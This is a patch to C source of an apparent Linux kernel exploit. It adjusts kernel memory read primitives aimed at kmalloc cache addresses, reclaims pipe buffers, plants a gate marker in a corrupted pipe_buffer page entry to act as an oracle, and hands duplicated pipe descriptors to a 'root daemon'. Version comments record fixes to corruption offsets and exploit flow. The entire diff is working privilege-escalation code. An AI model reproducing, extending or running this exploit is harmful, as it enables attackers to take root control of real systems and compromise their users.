@@ -405,7 +405,10 @@ int pipe_reclaim_cache_gate(int fd) {
 
   uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
   memset(cache_slots, 0, sizeof(cache_slots));
-  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
+  /* q6q v20 (kp18): Image .data reads use the canonical text address - the
+   * linear alias is unmapped.  kernel_read_data is the configfs primitive,
+   * which copies through the kernel and works with canonical targets. */
+  uintptr_t kmalloc_caches = text_addr(KMALLOC_CACHES);
   kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
   kmalloc_normal_1k_cache =
     cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
@@ -417,7 +420,7 @@ int pipe_reclaim_cache_gate(int fd) {
     cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];
 
   kmalloc_pipe_cache =
-    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
+    kernel_read64(fd, text_addr(KMALLOC_CGROUP_PIPE_SLOT));
   pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
           "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
           kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
@@ -905,9 +908,17 @@ static int pipe_duplicate_bytes(
 }
 
 static int transfer_p0_references_to_root(int retained_pipe_index) {
+  int gate_holder = p0_gate_holders[retained_pipe_index][0];
+  if (gate_holder < 0) {
+    /* q6q v21: the FOPS flow never runs the gate verify, so no tee holder
+     * exists; hand the root daemon a duplicate of the physrw pipe's read
+     * end instead. */
+    gate_holder = (int)fcntl(pipe_fds_reclaim[retained_pipe_index][0],
+                             F_DUPFD_CLOEXEC, 512);
+  }
   int retained_fds[] = {
     pipe_fds_reclaim[retained_pipe_index][0],
-    p0_gate_holders[retained_pipe_index][0],
+    gate_holder,
     reclaim_receiver_fd(),
   };
   for (size_t index = 0;
@@ -969,7 +980,7 @@ static int transfer_p0_references_to_root(int retained_pipe_index) {
   return transferred;
 }
 
-static void spawn_p0_ref_keeper(int retained_pipe_index) {
+void spawn_p0_ref_keeper(int retained_pipe_index) {
   pid_t child = SYSCHK(fork());
   if (child != 0) {
     pr_info("p0 reference keeper pid=%d pipe=%d\n",
@@ -1056,6 +1067,15 @@ int prepare_p0_pipe_oracle(void) {
                          sizeof(marker))) {
       return 0;
     }
+#if defined(APP_P0_ORACLE_SLOT1_GATE) && APP_P0_ORACLE_SLOT1_GATE
+    /* q6q v16 (kp14 fix): the gate marker targets entry 1's .page
+     * (+0x828), so every gate pipe must carry a second filled entry for
+     * the marker to be drained by the verify read. */
+    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
+                         sizeof(marker))) {
+      return 0;
+    }
+#endif
   }
   pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
           pipebuf_page_base, PIPE_RECLAIM);
@@ -1080,34 +1100,40 @@ int expand_p0_pipe_oracle(void) {
 }
 
 int verify_p0_pipe_oracle_gate(void) {
-  unsigned char page[PAGE_SIZE];
+  unsigned char page[2 * PAGE_SIZE];
   int gate_hits = 0;
   int gate_pipe_index = -1;
   int changed_pages = 0;
+  size_t read_size = PAGE_SIZE;
+#if defined(APP_P0_ORACLE_SLOT1_GATE) && APP_P0_ORACLE_SLOT1_GATE
+  /* q6q v16 (kp14 fix): gate pipes carry two entries; the marker corrupts
+   * entry 1's .page, so drain and scan both pages. */
+  read_size = 2 * PAGE_SIZE;
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   p0_gate_holders_initialized = 1;
 #endif
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
-                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
+                              p0_gate_holders[pipe_index], read_size,
+                              read_size / PAGE_SIZE)) {
       pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                  pipe_index, errno);
       spawn_p0_ref_keeper(-1);
       return 0;
     }
-    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
-                        sizeof(page))) {
+    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page, read_size)) {
       spawn_p0_ref_keeper(-1);
       return 0;
     }
-    size_t gate_offset = PAGE_SIZE;
-    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
+    size_t gate_offset = read_size;
+    for (size_t offset = 0; offset + 18 <= read_size; offset++) {
       if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
         gate_offset = offset;
         break;
       }
     }
-    if (gate_offset != PAGE_SIZE) {
+    if (gate_offset != read_size) {
       gate_hits++;
       gate_pipe_index = (int)pipe_index;
       pr_info("p0 gate marker pipe=%zu offset=%zu\n",
